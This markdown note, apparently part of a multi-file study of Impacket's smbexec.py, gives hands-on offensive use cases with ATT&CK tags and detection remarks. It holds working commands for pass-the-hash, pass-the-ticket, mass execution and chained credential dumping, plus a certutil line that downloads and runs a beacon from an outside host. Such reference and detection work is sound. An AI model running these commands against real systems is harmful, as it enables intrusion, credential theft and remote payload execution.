# Impacket — smbexec.py — Hands-On Use Cases

Every scenario below rides the same create-service/start/delete-per-command cycle documented in `01 - Overview.md` §How It Works — what changes is the credential material, which mode retrieves output, and how the operator drives the shell (interactively vs. piped). MITRE ATT&CK technique(s) are tagged per scenario since the combination shifts depending on the variant (e.g. adding pass-the-hash layers `T1550.002` on top of the baseline `T1569.002`/`T1021.002`).

## Contents
- [Semi-Interactive SYSTEM Shell via Cleartext Credentials](#semi-interactive-system-shell-via-cleartext-credentials)
- [Pass-the-Hash](#pass-the-hash)
- [Pass-the-Ticket (Kerberos)](#pass-the-ticket-kerberos)
- [Kerberos with an AES Key or Keytab](#kerberos-with-an-aes-key-or-keytab)
- [Switching to a PowerShell-Wrapped Shell](#switching-to-a-powershell-wrapped-shell)
- [SERVER Mode — No Writable Share on the Target](#server-mode--no-writable-share-on-the-target)
- [Blending In with a Custom Service Name](#blending-in-with-a-custom-service-name)
- [Moving the Output Relay Off C$](#moving-the-output-relay-off-c)
- [Alternate-Port Targeting](#alternate-port-targeting)
- [Local Command Execution Mid-Session](#local-command-execution-mid-session)
- [Piping a Single Command via stdin](#piping-a-single-command-via-stdin)
- [Fleet-Wide / Mass Execution](#fleet-wide--mass-execution)
- [Staging a Secondary C2 Payload](#staging-a-secondary-c2-payload)
- [Chained Use After Credential Harvesting](#chained-use-after-credential-harvesting)

---

## Semi-Interactive SYSTEM Shell via Cleartext Credentials

**MITRE ATT&CK:** [T1569.002](https://attack.mitre.org/techniques/T1569/002/) (System Services: Service Execution) · [T1021.002](https://attack.mitre.org/techniques/T1021/002/) (Remote Services: SMB/Windows Admin Shares) · [T1059.003](https://attack.mitre.org/techniques/T1059/003/) (Command and Scripting Interpreter: Windows Command Shell)

The baseline case — every other scenario in this note is a variation on this one.

```bash
# 1. (optional) confirm creds are valid + local-admin before touching the target
netexec smb 10.10.10.5 -u 'jsmith' -p 'Summer2026!' --local-auth

# 2. Get a semi-interactive shell (default -mode SHARE, default -share C$)
smbexec.py 'CORP/jsmith:Summer2026!@10.10.10.5'
```
Lands in a `C:\Windows\system32>`-style prompt running as `NT AUTHORITY\SYSTEM`. Every single command typed — including the automatic prompt-refresh that fires the instant the shell connects — triggers its own create-service → start → delete cycle on the target. This is fundamentally different from `psexec.py`'s one-service-for-the-whole-session model; see the burst-pattern discussion in `04 - Target Evidence.md`.

## Pass-the-Hash

**MITRE ATT&CK:** [T1550.002](https://attack.mitre.org/techniques/T1550/002/) (Use Alternate Authentication Material: Pass the Hash), plus the baseline T1569.002/T1021.002

```bash
# LM hash unknown/blank -> use the standard blank-LM placeholder
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
  CORP/administrator@10.10.10.5
```
No cleartext password needed — the NT hash alone authenticates the single SMB session that carries both the SVCCTL execution channel and the output-relay share access.

## Pass-the-Ticket (Kerberos)

**MITRE ATT&CK:** [T1550.003](https://attack.mitre.org/techniques/T1550/003/) (Use Alternate Authentication Material: Pass the Ticket) · T1021.002

```bash
# Prereqs: hostname (not bare IP) must resolve, clock skew < 5 min from the DC
export KRB5CCNAME=administrator.ccache
smbexec.py -k -no-pass CORP/administrator@dc01.corp.local
```
As with `psexec.py`/`wmiexec.py`, Kerberos requires the target's **FQDN** since the ticket is bound to an SPN — a bare IP breaks the Kerberos path.

## Kerberos with an AES Key or Keytab

**MITRE ATT&CK:** T1550.003 · T1021.002 — quieter variant, avoids NTLM entirely

```bash
# AES key (128 or 256-bit) instead of a password/RC4 material
smbexec.py -k -no-pass -aesKey <256-bit-aes-key-hex> CORP/svc-backup@dc01.corp.local

# Or: authenticate a service account straight from a keytab
smbexec.py -k -no-pass -keytab svc-backup.keytab CORP/svc-backup@dc01.corp.local
```
Common for **service-account** abuse — service accounts frequently carry keytabs or long-lived AES keys rather than interactively-typed passwords. Note `smbexec.py` has **no `-A` authentication-file option** the way `wmiexec.py` does — this is the closest it gets to keeping a secret off the raw command line.

## Switching to a PowerShell-Wrapped Shell

**MITRE ATT&CK:** [T1059.001](https://attack.mitre.org/techniques/T1059/001/) (Command and Scripting Interpreter: PowerShell)

```bash
smbexec.py -shell-type powershell CORP/jsmith:Summer2026!@10.10.10.5
```
Every command typed is prefixed with `$ProgressPreference="SilentlyContinue";`, base64-encoded (UTF-16LE), and wrapped as `powershell.exe -NoP -NoL -sta -NonI -W Hidden -Exec Bypass -Enc <b64>` — but that whole string is still `echo`'d into the same batch-file/redirect wrapper documented in `01 - Overview.md`. Unlike `wmiexec.py`, there's no flag to strip the batch-file layer entirely — PowerShell mode changes the payload, not the delivery mechanism.

## SERVER Mode — No Writable Share on the Target

**MITRE ATT&CK:** T1569.002 · T1021.002

```bash
# Requires root/admin on the OPERATOR's own machine to bind TCP 445 locally
sudo smbexec.py -mode SERVER CORP/jsmith:Summer2026!@10.10.10.5
```
Used when the authenticating account can't write to any share on the target. `smbexec.py` stands up its own throwaway SMB server (fixed banner: server name `server_name`, OS `UNIX`, domain `WORKGROUP` — a fingerprintable ad hoc listener), and the batch command's compound line gains a `copy` clause that pushes the output file back to the operator instead of the operator pulling it. **Operational tradeoff verified against source:** this mode does **not** delete the output file it left on the target — every command overwrites the same `__output_<8-random-letters>` file on the target's share, and it's never cleaned up. `SERVER` mode is a necessity fallback, not an OPSEC improvement — see `04 - Target Evidence.md`.

## Blending In with a Custom Service Name

```bash
smbexec.py -service-name "WindowsUpdateSvc" CORP/jsmith:Summer2026!@10.10.10.5
```
Every create/start/delete cycle for the rest of the session uses this name instead of a random 8-character string. It makes each individual System 7045 entry look more benign, but it does **not** change the burst pattern — a hunt that flags "many 7045 events sharing one `ServiceName` in a tight window" catches this just as well with a custom name as with the default random one. See the hunting-priority table in `05 - Detection and Hunting.md`.

## Moving the Output Relay Off C$

```bash
smbexec.py -share ADMIN$ CORP/jsmith:Summer2026!@10.10.10.5
```
`smbexec.py` defaults to `C$`, not `ADMIN$` — a genuine difference from both `psexec.py` and `wmiexec.py`, which both default to `ADMIN$`. Changing `-share` only relocates the transient output file; it has no effect on the service-creation pattern itself.

## Alternate-Port Targeting

```bash
# Legacy NetBIOS port, e.g. if 445 is filtered but 139 isn't
smbexec.py -port 139 CORP/jsmith:Summer2026!@10.10.10.5
```

## Local Command Execution Mid-Session

```
smbexec.py CORP/jsmith:Summer2026!@10.10.10.5
SMBEXEC> shell whoami
```
`shell {cmd}` runs entirely on the **operator's** own machine (`os.system()`) — a quick way to check something locally (e.g. decode a recovered hash) without leaving the session. Generates zero target-side evidence; only relevant to `03 - Source Evidence.md`.

## Piping a Single Command via stdin

**MITRE ATT&CK:** T1569.002

```bash
echo "whoami /all" | smbexec.py CORP/jsmith:Summer2026!@10.10.10.5
```
`smbexec.py`'s argument parser has **no positional `command` argument** — verified against source — so there is no direct CLI equivalent of `psexec.py CORP/user:pass@target "whoami"`. The standard way to script a single non-interactive command is to pipe it into stdin, relying on Python's `cmd.Cmd` reading commands from stdin when it isn't attached to a TTY. The full create/start/delete/read cycle still runs once for that one line, then `EOF` on stdin triggers `do_exit()`.

## Fleet-Wide / Mass Execution

```bash
# Scripted across a target list — common for password-spray validation,
# IOC sweeps, or (on the attacker side of a real intrusion) ransomware deployment
for ip in $(cat targets.txt); do
  echo "[*] $ip"
  echo "whoami" | smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8846f7eaee8fb117ad06bdd830b7586c \
    CORP/administrator@"$ip" 2>&1 | tee -a results.log
done
```
Each host in the loop generates its own service-creation burst — at scale, this is a strong ransomware-deployment/mass-lateral-movement indicator: many hosts each showing 2+ near-simultaneous 7045 events (the auto-priming `cd` plus the actual command) with the same `ServiceName` pattern, within a tight overall window.

## Staging a Secondary C2 Payload

**MITRE ATT&CK:** T1569.002, plus [T1105](https://attack.mitre.org/techniques/T1105/) (Ingress Tool Transfer)

```bash
echo 'certutil -urlcache -f http://198.51.100.7/beacon.exe C:\Windows\Temp\svc.exe && C:\Windows\Temp\svc.exe' \
  | smbexec.py CORP/jsmith:Summer2026!@10.10.10.5
```
`smbexec.py` has no `-c`/`lput`-style file-drop mechanism at all (unlike `psexec.py`'s `-c` or `wmiexec.py`'s `lput`) — any payload delivery has to happen through a command the target itself executes, such as a `certutil`/`curl`/`Invoke-WebRequest` one-liner. Once a C2 implant lands and runs, the target evidence trail gains a second, independent layer on top of smbexec's own — see `04 - Target Evidence.md`.

## Chained Use After Credential Harvesting

This is the canonical Impacket workflow — `smbexec.py` is rarely the *first* tool run in an intrusion; it's usually the payoff step after credential material was harvested by a sibling Impacket script.

```bash
# 1. Dump local SAM hashes from an already-compromised host
secretsdump.py CORP/jsmith:Summer2026!@10.10.10.20 -sam -system

# 2. Immediately reuse a recovered local admin hash to move to the next host —
#    an operator might choose smbexec.py over psexec.py specifically when no
#    writable ADMIN$ share exists but C$ still does, or as a simple variant
#    for defensive diversity across an engagement
smbexec.py -hashes aad3b435b51404eeaad3b435b51404ee:<recovered-nt-hash> \
  Administrator@10.10.10.21
```
Recognizing this **chain** — not just the individual tool — is what separates a fast, high-confidence detection from a slow one: a `secretsdump.py`-shaped access pattern against one host followed within minutes by a `smbexec.py`-shaped burst of same-`ServiceName` 7045 events against a *different* host, using the *same source IP*, is a textbook Impacket lateral-movement chain.
